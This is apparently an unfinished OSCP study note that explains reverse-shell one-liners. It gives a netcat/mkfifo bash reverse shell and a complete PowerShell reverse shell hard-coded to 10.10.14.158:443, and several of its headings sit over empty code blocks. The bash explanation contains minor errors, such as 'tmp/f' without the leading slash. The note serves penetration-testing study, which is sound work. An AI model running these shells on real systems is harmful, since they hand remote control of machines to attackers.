---
permalink: oscp/techniques/shells-and-payloads/oneliners-explained
title: Oneliners Explained
type: note
---

## Bash Oneliners

### Netcat Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > tmp/f
```
- `rm -f /tmp/f` deletes `tmp` if it already exists
- `mkfifo /tmp/f` creates a named pipe (FIFO), used to pass data between processes
- `cat /tmp/f` reads commands from the pipe
- `/bin/bash -i` starts a interactive bash shell
- `2>&1` combines error messages with normal output

---

## Powershell One-liners Explained
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Calling Powershell
```powershell
powershell -nop -c
```

###  Binding a Socket
```powershell
"$client = New-Object System.Net.Sockets.TCPClient(<IP>, <PORT>);
```

### Setting the Command Stream
```powershell

```
### Calling Powershell
```powershell

```

### Calling Powershell
```powershell

```
